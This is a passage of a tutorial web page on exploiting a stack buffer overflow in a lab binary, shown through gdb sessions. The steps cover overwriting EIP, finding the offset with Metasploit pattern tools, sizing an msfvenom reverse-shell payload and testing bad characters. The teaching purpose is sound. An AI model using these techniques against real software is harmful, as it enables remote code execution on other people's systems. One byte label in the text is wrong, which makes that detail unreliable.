+   0x00000000000006c7 &lt;+11&gt;:	mov    QWORD PTR [rbp-0x10],rsi
+   0x00000000000006cb &lt;+15&gt;:	mov    rax,QWORD PTR [rbp-0x10]
+   0x00000000000006cf &lt;+19&gt;:	add    rax,0x8
+   0x00000000000006d3 &lt;+23&gt;:	mov    rax,QWORD PTR [rax]
+   0x00000000000006d6 &lt;+26&gt;:	mov    rdi,rax
+   0x00000000000006d9 &lt;+29&gt;:	call   0x68a &lt;bowfunc&gt;
+   0x00000000000006de &lt;+34&gt;:	lea    rdi,[rip+0x9f]
+   0x00000000000006e5 &lt;+41&gt;:	call   0x560 &lt;puts@plt&gt;
+   0x00000000000006ea &lt;+46&gt;:	mov    eax,0x1
+   0x00000000000006ef &lt;+51&gt;:	leave  
+   0x00000000000006f0 &lt;+52&gt;:	ret    
+End of assembler dump.
+</pre></table></code></div></div><p>The most important instruction for us right now is the <strong>call</strong> instruction. The <strong>call</strong> instruction is used to call a function and performs two operations:</p><ol><li>it pushes the return address onto the <strong>stack</strong> so that the execution of the program can be continued after the function has successfully fulfilled its goal<li>it changes the <strong>Instruction Pointer</strong> (<strong>EIP</strong>) to the call destination and starting execution there</ol><p>With the Intel Syntax:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>zero@pio$ gdb ./bow32 -q
+
+Reading symbols from bow...(no debugging symbols found)...done.
+(gdb) disassemble main
+
+Dump of assembler code for function main:
+   0x00000582 &lt;+0&gt;: 	lea    ecx,[esp+0x4]
+   0x00000586 &lt;+4&gt;: 	and    esp,0xfffffff0
+   0x00000589 &lt;+7&gt;: 	push   DWORD PTR [ecx-0x4]
+   0x0000058c &lt;+10&gt;:	push   ebp
+   0x0000058d &lt;+11&gt;:	mov    ebp,esp
+   0x0000058f &lt;+13&gt;:	push   ebx
+   0x00000590 &lt;+14&gt;:	push   ecx
+   0x00000591 &lt;+15&gt;:	call   0x450 &lt;__x86.get_pc_thunk.bx&gt;
+   0x00000596 &lt;+20&gt;:	add    ebx,0x1a3e
+   0x0000059c &lt;+26&gt;:	mov    eax,ecx
+   0x0000059e &lt;+28&gt;:	mov    eax,DWORD PTR [eax+0x4]
+   0x000005a1 &lt;+31&gt;:	add    eax,0x4
+   0x000005a4 &lt;+34&gt;:	mov    eax,DWORD PTR [eax]
+   0x000005a6 &lt;+36&gt;:	sub    esp,0xc
+   0x000005a9 &lt;+39&gt;:	push   eax
+   0x000005aa &lt;+40&gt;:	call   0x54d &lt;bowfunc&gt;		# &lt;--- CALL function
+</pre></table></code></div></div><h2 id="endianness"><span class="mr-2">Endianness</span><a href="#endianness" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>During load and save operations in registers and memories, the bytes are read in a different order. This byte order is called <strong>endianness</strong>. Endianness is distinguished between the <strong>little-endian</strong> format and the <strong>big-endian</strong> format. Big-endian and little-endian are about the order of valence. In big-endian, the digits with the <strong>highest valence</strong> are initially. In little-endian, the digits with the <strong>lowest valence</strong> are at the beginning. Mainframe processors use the big-endian format, some <strong>RISC architectures</strong>, minicomputers, and in TCP/IP networks, the byte order is also in big-endian format.</p><p>With the following example:</p><ul><li>Address: <code class="language-plaintext highlighter-rouge">0xffff0000</code><li>Word: <code class="language-plaintext highlighter-rouge">\xAA\xBB\xCC\xDD</code></ul><div class="table-wrapper"><table><thead><tr><th><strong>Memory Address</strong><th><strong>0xffff0000</strong><th><strong>0xffff0001</strong><th><strong>0xffff0002</strong><th><strong>0xffff0003</strong><tbody><tr><td>Big-Endian<td>AA<td>BB<td>CC<td>DD<tr><td>Little-Endian<td>DD<td>CC<td>BB<td>AA</table></div><hr /><h1 id="exploit">Exploit</h1><h2 id="take-control-of-eip"><span class="mr-2">Take Control of EIP</span><a href="#take-control-of-eip" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>One of the most important aspects of a stack-based buffer overflow is to get the <strong>Instruction Pointer</strong> (<strong>EIP</strong>) under control, so we can tell it to which address it should jump. This will make the <strong>EIP</strong> point to the address where our <strong>shellcode</strong> starts and causes the CPU to execute it.</p><p>We can execute commands in GDB using Python, which serves us directly as input.</p><h3 id="segmentation-fault"><span class="mr-2">Segmentation Fault</span><a href="#segmentation-fault" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we insert 1200 “U”s (hex “<strong>55</strong>”) as input, we can see from the register information that we have overwritten the <strong>EIP</strong>. As far as we know, the <strong>EIP</strong> points to the next instruction to be executed.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>zero@pio$ gdb -q bow32
+
+(gdb) run $(python -c "print '\x55' * 1200")
+Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x55555555 in ?? ()
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>(gdb) info registers 
+
+eax            0x1	1
+ecx            0xffffd6c0	-10560
+edx            0xffffd06f	-12177
+ebx            0x55555555	1431655765
+esp            0xffffcfd0	0xffffcfd0
+ebp            0x55555555	0x55555555		# &lt;---- EBP overwritten
+esi            0xf7fb5000	-134524928
+edi            0x0	0
+eip            0x55555555	0x55555555		# &lt;---- EIP overwritten
+eflags         0x10286	[ PF SF IF RF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+</pre></table></code></div></div><h3 id="determine-the-offset"><span class="mr-2">Determine The Offset</span><a href="#determine-the-offset" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The offset is used to determine how many bytes are needed to overwrite the buffer and how much space we have around our shellcode. Shellcode is a program code that contains instructions for an operation that we want the CPU to perform.</p><p>Let’s use the script <strong>pattern_create</strong> to determinate the exact number of bytes to reach the EIP:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> 1200 <span class="o">&gt;</span> pattern.txt
+<span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">cat </span>pattern.txt
+<span class="go">
+</span><span class="gp">Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;</span>...Bn6Bn7Bn8Bn9
+</pre></table></code></div></div><p>Now replace the 1200 “U”s with the pattern:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9'") 
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9'")
+Program received signal SIGSEGV, Segmentation fault.
+0x69423569 in ?? ()
+</pre></table></code></div></div><p>We see that the EIP displays a different memory address:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>(gdb) info registers eip
+
+eip            0x69423569	0x69423569
+</pre></table></code></div></div><p>We can use another MSF tool called “<strong>pattern_offset</strong>” to calculate the exact number of characters (offset) needed to advance to the <strong>EIP</strong>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>zero@pio$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
+
+[*] Exact match at offset 1036
+</pre></table></code></div></div><p>If we now use precisely this number of bytes for our “U”s, we should land exactly on the <strong>EIP</strong>. To overwrite it and check if we have reached it as planned, we can add 4 more bytes with “\x66” and execute it to ensure we control the <strong>EIP</strong>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
+Program received signal SIGSEGV, Segmentation fault.
+0x66666666 in ?? ()
+</pre></table></code></div></div><p>Now we see that we have overwritten the <strong>EIP</strong> with our “\x66” characters. Next, we have to find out how much space we have for our shellcode, which then executes the commands we intend.</p><h2 id="determine-the-length-for-shellcode"><span class="mr-2">Determine the Length for Shellcode</span><a href="#determine-the-length-for-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It is trendy and useful for us to exploit such a vulnerability to get a reverse shell. First, we have to find out approximately how big our shellcode will be that we will insert, and for this, we will use <strong>msfvenom</strong>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>zero@pio$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c 
+
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+</pre></table></code></div></div><p>We now know that our payload will be about 68 bytes. As a precaution, we should try to take a larger range if the shellcode increases due to later specifications.</p><p>Often it can be useful to insert some <strong>No Operation Instruction</strong> (NOPS) before our shellcode begins so that it can be executed cleanly. Let us briefly summarize what we need for this:</p><ul><li>We need a total of 1040 bytes to get to the <strong>EIP</strong><li>Here, we can use an additional 100 bytes of <strong>NOPs</strong><li>150 bytes for our shellcode</ul><p>The length will be:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
+     NOPs = "\x90" * 100
+Shellcode = "\x44" * 150
+      EIP = "\x66" * 4'
+</pre></table></code></div></div><h2 id="identification-of-bad-characters"><span class="mr-2">Identification of Bad Characters</span><a href="#identification-of-bad-characters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Previously in UNIX-like operating systems, binaries started with two bytes containing a “<strong>magic number</strong>” that determines the file type. In the beginning, this was used to identify object files for different platforms. Gradually this concept was transferred to other files, and now almost every file contains a magic number.</p><p>These reserved characters, also known as <strong>bad characters</strong> can vary, but often we will see characters like this:</p><ul><li><code class="language-plaintext highlighter-rouge">\x00</code> - Null Byte<li><code class="language-plaintext highlighter-rouge">\x0A</code> - Line Feed<li><code class="language-plaintext highlighter-rouge">\x0D</code> - Carriage Return<li><code class="language-plaintext highlighter-rouge">\xFF</code> - Form Feed</ul><p>To calculate the number of bytes in our CHARS variable, we can use bash by replacing the “\x” with space and then use wc to count the words:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nv">CHARS</span><span class="o">=</span><span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">7b</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">87</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">94</span><span class="se">\x</span><span class="s2">95</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">9b</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">9e</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">a1</span><span class="se">\x</span><span class="s2">a2</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">a4</span><span class="se">\x</span><span class="s2">a5</span><span class="se">\x</span><span class="s2">a6</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">aa</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">ae</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">b2</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">b5</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">d3</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">dc</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">fd</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">ff"</span>
+<span class="go">
+</span><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">echo</span> <span class="nv">$CHARS</span> | <span class="nb">sed</span> <span class="s1">'s/\\x/ /g'</span> | <span class="nb">wc</span> <span class="nt">-w</span>
+<span class="go">
+256
+</span></pre></table></code></div></div><p>This string is 256 bytes long. So we need to calculate our buffer again. If we execute it now, the program will crash without giving us the possibility to follow what happens in the memory. So we will set a breakpoint at the corresponding function so that the execution stops at this point, and we can analyze the memory’s content.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>(gdb) disas main
+Dump of assembler code for function main:
+   0x56555582 &lt;+0&gt;: 	lea    ecx,[esp+0x4]
+   0x56555586 &lt;+4&gt;: 	and    esp,0xfffffff0
+   0x56555589 &lt;+7&gt;: 	push   DWORD PTR [ecx-0x4]
+   0x5655558c &lt;+10&gt;:	push   ebp
+   0x5655558d &lt;+11&gt;:	mov    ebp,esp
+   0x5655558f &lt;+13&gt;:	push   ebx
+   0x56555590 &lt;+14&gt;:	push   ecx
+   0x56555591 &lt;+15&gt;:	call   0x56555450 &lt;__x86.get_pc_thunk.bx&gt;
+   0x56555596 &lt;+20&gt;:	add    ebx,0x1a3e
+   0x5655559c &lt;+26&gt;:	mov    eax,ecx
+   0x5655559e &lt;+28&gt;:	mov    eax,DWORD PTR [eax+0x4]
+   0x565555a1 &lt;+31&gt;:	add    eax,0x4
+   0x565555a4 &lt;+34&gt;:	mov    eax,DWORD PTR [eax]
+   0x565555a6 &lt;+36&gt;:	sub    esp,0xc
+   0x565555a9 &lt;+39&gt;:	push   eax
+   0x565555aa &lt;+40&gt;:	call   0x5655554d &lt;bowfunc&gt;		# &lt;---- bowfunc Function
+   0x565555af &lt;+45&gt;:	add    esp,0x10
+   0x565555b2 &lt;+48&gt;:	sub    esp,0xc
+   0x565555b5 &lt;+51&gt;:	lea    eax,[ebx-0x1974]
+   0x565555bb &lt;+57&gt;:	push   eax
+   0x565555bc &lt;+58&gt;:	call   0x565553e0 &lt;puts@plt&gt;
+   0x565555c1 &lt;+63&gt;:	add    esp,0x10
+   0x565555c4 &lt;+66&gt;:	mov    eax,0x1
+   0x565555c9 &lt;+71&gt;:	lea    esp,[ebp-0x8]
+   0x565555cc &lt;+74&gt;:	pop    ecx
+   0x565555cd &lt;+75&gt;:	pop    ebx
+   0x565555ce &lt;+76&gt;:	pop    ebp
+   0x565555cf &lt;+77&gt;:	lea    esp,[ecx-0x4]
+   0x565555d2 &lt;+80&gt;:	ret    
+End of assembler dump.
+</pre></table></code></div></div><p>Let’s add the command <code class="language-plaintext highlighter-rouge">break</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>(gdb) break bowfunc 
+
+Breakpoint 1 at 0x56555551
+</pre></table></code></div></div><p>Now we can execute it. Send the char:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')
+
+Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff" + "\x66" * 4')
+/bin/bash: warning: command substitution: ignored null byte in input
+
+Breakpoint 1, 0x56555551 in bowfunc ()
+</pre></table></code></div></div><p>Now we can look at the <strong>Stack</strong>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>(gdb) x/2000xb $esp+500
+
+0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
+0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
+0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
+0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
